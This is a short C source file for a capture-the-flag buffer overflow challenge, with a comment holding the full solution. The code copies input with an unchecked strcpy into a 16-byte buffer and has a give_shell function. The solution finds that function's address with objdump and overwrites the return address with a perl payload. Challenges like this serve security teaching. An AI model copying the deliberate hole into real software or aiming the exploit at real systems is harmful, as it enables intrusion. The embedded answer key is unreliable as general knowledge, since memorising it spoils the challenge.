/*
** Solution
** objdump -d ./overflow2|grep give_shell                     
** 080484ad <give_shell>:                                                            
** ./overflow2 $(perl -e 'print "A"x28 . "\xad\x84\x04\x08"') 
** cat flag.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
